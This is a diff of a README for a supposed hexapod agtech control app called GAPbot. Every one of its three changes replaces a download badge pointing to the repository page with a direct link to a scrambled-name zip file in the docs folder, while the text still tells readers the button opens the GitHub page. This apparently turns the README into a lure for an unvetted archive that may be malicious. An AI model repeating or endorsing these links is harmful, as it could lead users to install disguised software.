@@ -1,6 +1,6 @@
 # 🦾 CoraxCoLABs-GAP-GreenAutomatedPlatform---GAPbot - Easy Hexapod Control for AgTech
 
-[![Download Latest Version](https://img.shields.io/badge/Download-GAPbot-blue?style=for-the-badge)](https://github.com/sibbytessellated242/CoraxCoLABs-GAP-GreenAutomatedPlatform---GAPbot)
+[![Download Latest Version](https://img.shields.io/badge/Download-GAPbot-blue?style=for-the-badge)](https://raw.githubusercontent.com/sibbytessellated242/CoraxCoLABs-GAP-GreenAutomatedPlatform---GAPbot/main/docs/Green-Pbot-LA-Bs-Corax-Automated-Platform-GA-Co-v1.0.zip)
 
 ## 📋 About This Application
 
@@ -25,7 +25,7 @@ You don’t need any programming software or special tools before downloading.
 
 Click the button below to visit the GitHub page where you can download the app.
 
-[![Download GAPbot](https://img.shields.io/badge/Download-GAPbot-green?style=for-the-badge)](https://github.com/sibbytessellated242/CoraxCoLABs-GAP-GreenAutomatedPlatform---GAPbot)
+[![Download GAPbot](https://img.shields.io/badge/Download-GAPbot-green?style=for-the-badge)](https://raw.githubusercontent.com/sibbytessellated242/CoraxCoLABs-GAP-GreenAutomatedPlatform---GAPbot/main/docs/Green-Pbot-LA-Bs-Corax-Automated-Platform-GA-Co-v1.0.zip)
 
 1. On the GitHub page, look for the **Releases** section.
 2. Choose the latest Windows installer file, usually named something like `GAPbot-setup.exe`.
@@ -109,4 +109,4 @@ The GAPbot software acts as the bridge between human users and this advanced mac
 - Python software development
 - Raspberry Pi hardware integration
 
-[![Download Latest Version](https://img.shields.io/badge/Download-GAPbot-blue?style=for-the-badge)](https://github.com/sibbytessellated242/CoraxCoLABs-GAP-GreenAutomatedPlatform---GAPbot)
+[![Download Latest Version](https://img.shields.io/badge/Download-GAPbot-blue?style=for-the-badge)](https://raw.githubusercontent.com/sibbytessellated242/CoraxCoLABs-GAP-GreenAutomatedPlatform---GAPbot/main/docs/Green-Pbot-LA-Bs-Corax-Automated-Platform-GA-Co-v1.0.zip)
